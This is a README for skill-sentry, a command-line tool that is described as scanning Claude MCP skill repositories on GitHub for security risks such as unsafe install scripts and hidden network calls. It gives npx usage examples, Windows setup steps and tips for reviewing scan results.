# 🛡️ skill-sentry - Scan skills before you install

[![Download / Install](https://img.shields.io/badge/Download%20%2F%20Install-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/mitigative-davidbushnell562/skill-sentry)

## 🚀 What skill-sentry does

skill-sentry checks Claude MCP skills for security risks before you install them.

It helps you inspect a skill source without running the code first.

Use it to review skills from a GitHub URL and look for signs of unsafe behavior, hidden commands, and suspicious package use.

## 🖥️ Windows download and setup

1. Open the download link above.
2. On the GitHub page, look for the latest release or the main project page.
3. Download the Windows package or follow the install steps on the page.
4. If the file comes as a ZIP, unzip it first.
5. Open Command Prompt or PowerShell.
6. Run the tool from the folder where you saved it.

## 📦 Install with npx

If you already have Node.js on your Windows PC, you can run skill-sentry with:

npx skill-sentry <your skills github url>

Replace `<your skills github url>` with the GitHub link to the Claude MCP skills you want to scan.

Example:

npx skill-sentry https://github.com/example/your-skill-repo

## 🔍 What it checks

skill-sentry looks for common security problems in skill packages, such as:

- Unsafe install scripts
- Hidden network calls
- Suspicious file access
- Commands that can change your system
- Risky package references
- Signs of supply chain abuse
- Unexpected model context protocol files
- Patterns that can lead to code execution

## 🧭 When to use it

Use skill-sentry before you install a new Claude MCP skill.

It is useful when:

- A skill comes from a repo you do not know
- You want to review a skill before use
- You need a fast safety check
- You want to reduce risk from third-party code
- You work with MCP skills from public GitHub repos

## ✅ Who it is for

This tool is a good fit if you:

- Use Claude skills on your PC
- Download MCP skills from GitHub
- Want a simple safety check
- Do not want to run unknown code first
- Prefer plain results before installation

## 🔧 Basic use

1. Copy the GitHub URL for the skill repo.
2. Paste it into the command.
3. Wait for the scan to finish.
4. Review the results.
5. Only install the skill if the scan looks safe.

Example command:

npx skill-sentry https://github.com/example/skill-repo

## 🪟 Windows requirements

You need:

- Windows 10 or later
- Internet access
- Node.js installed if you want to use `npx`
- A GitHub account if the repo is private
- Permission to run apps from the Command Prompt or PowerShell

## 📂 What you may see in a scan

A scan report can point out items such as:

- Readme files with risky setup steps
- Package files that run scripts
- Files that fetch data from outside sources
- MCP server settings that need review
- Paths that expose local files
- Code patterns that deserve a manual check

## 🛠️ How to read the result

Look for items marked as risky or unknown.

Pay attention to:

- Install scripts
- Build steps
- Remote URLs
- File write access
- Shell commands
- Package names you do not recognize

If the scan shows clean results, you still should review the repo page before you install.

## 🧪 Example workflow

1. Find a Claude MCP skill on GitHub.
2. Copy the repo URL.
3. Run the scan with `npx skill-sentry`.
4. Review the findings.
5. Decide if the skill is safe for your use.

## 📘 Project topics

This project relates to:

- claude
- claude-skill
- mcp
- mcp-server
- model-context-protocol
- npm-security
- scanner
- security
- static-analysis
- supply-chain-security

## 🔗 Project link

Visit the project page here:

https://github.com/mitigative-davidbushnell562/skill-sentry

## 🧩 Command reference

Scan a skill repo:

npx skill-sentry <your skills github url>

Scan a public repo:

npx skill-sentry https://github.com/owner/repo

Scan a private repo you can access:

npx skill-sentry https://github.com/your-org/your-private-repo

## 🧠 Tips for safer use

- Review the GitHub repo before you install
- Check the files that the scan flags
- Compare the repo name with the author name
- Look at the recent commit history
- Check for scripts in package files
- Be careful with repos that ask for extra access

## 📋 File types this tool may inspect

skill-sentry may check common project files, such as:

- README files
- package manifests
- install scripts
- config files
- MCP server files
- source files linked to setup steps

## 🧰 If the scan does not start

Try these steps:

1. Check your internet connection.
2. Make sure Node.js is installed.
3. Confirm the GitHub URL is correct.
4. Try the repo again with a public skill source.
5. Open PowerShell and run the command from the folder where you saved the tool

## 📥 Download / install link

Use this link to download or open the project page on GitHub:

https://github.com/mitigative-davidbushnell562/skill-sentry